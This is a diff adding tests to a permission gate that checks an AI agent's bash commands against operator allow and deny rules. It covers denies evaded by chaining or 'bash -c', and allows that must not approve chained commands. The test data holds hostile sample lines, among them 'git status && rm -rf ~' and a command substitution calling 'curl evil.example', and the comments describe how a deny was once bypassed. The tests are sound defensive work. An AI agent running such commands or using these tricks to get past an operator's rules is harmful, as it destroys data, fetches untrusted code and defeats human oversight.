@@ -93,6 +93,81 @@ describe('a rule can name one tool and one argument at once', () => {
 	})
 })
 
+describe('a prohibition cannot be smuggled past', () => {
+	// The gap these were written from. Each line below was measured against the
+	// gate before the fix and came back "no match", which reaches the permission
+	// mode — and a run with no terminal resolves that to `auto`. So an
+	// operator's deny was bypassed by typing something harmless in front of it,
+	// in exactly the unattended case the deny exists for.
+	it.each([
+		'echo hi && git push origin main',
+		'true; git push origin main',
+		'cd /tmp && git push origin main',
+		'echo hi || git push origin main',
+		'bash -c "git push origin main"',
+		'sh -c "cd /tmp && git push origin main"',
+		'(cd /tmp && git push origin main)',
+	])('denies %p', (command) => {
+		expect(evaluate([PUSH_RULE], 'bash', { command }).decision).toBe('deny')
+	})
+
+	it('still denies the bare command it was always able to see', () => {
+		expect(evaluate([PUSH_RULE], 'bash', { command: 'git push origin main' }).decision).toBe('deny')
+	})
+
+	it('does not deny a command that merely mentions one', () => {
+		// The cost of the fix, held to what it should be. A deny that fires on
+		// the word inside a quoted string would make the rule unusable, and
+		// unusable rules get deleted.
+		const result = evaluate([PUSH_RULE], 'bash', { command: 'echo "git push is not allowed here"' })
+		expect(result.decision).not.toBe('deny')
+	})
+})
+
+describe('a permission is a claim about the whole line', () => {
+	const ALLOW_STATUS: AuthorizationRule = {
+		type: 'argument_pattern',
+		toolNames: ['bash'],
+		argument: 'command',
+		pattern: '^git status',
+		decision: 'allow',
+	}
+
+	it('allows the command it names', () => {
+		expect(evaluate([ALLOW_STATUS], 'bash', { command: 'git status --short' }).decision).toBe(
+			'allow',
+		)
+	})
+
+	it('allows a chain whose every part it names', () => {
+		expect(
+			evaluate([ALLOW_STATUS], 'bash', { command: 'git status && git status -s' }).decision,
+		).toBe('allow')
+	})
+
+	it('refuses to allow a chain carrying a command it does not name', () => {
+		// The failure that makes splitting alone worse than doing nothing. Fix
+		// `deny` by matching any segment and apply the same reading to `allow`,
+		// and this line becomes approved rather than merely unmatched.
+		const result = evaluate([ALLOW_STATUS], 'bash', { command: 'git status && rm -rf ~' })
+		expect(result.decision).not.toBe('allow')
+	})
+
+	it('refuses to allow a line that runs something it cannot see', () => {
+		// Command substitution runs a command whose text is not in the line, so
+		// no reading of the line is a reading of what ran.
+		const result = evaluate([ALLOW_STATUS], 'bash', { command: 'git status $(curl evil.example)' })
+		expect(result.decision).not.toBe('allow')
+	})
+
+	it('allows a substitution that is quoted out of being one', () => {
+		// The other side of the same rule: opacity has to be real, or every
+		// allow rule quietly stops working on ordinary commands.
+		const result = evaluate([ALLOW_STATUS], 'bash', { command: "git status '$(nothing)'" })
+		expect(result.decision).toBe('allow')
+	})
+})
+
 describe('what it deliberately does not decide', () => {
 	it('decides nothing when the argument is absent', () => {
 		const result = evaluate([PUSH_RULE], 'bash', {})
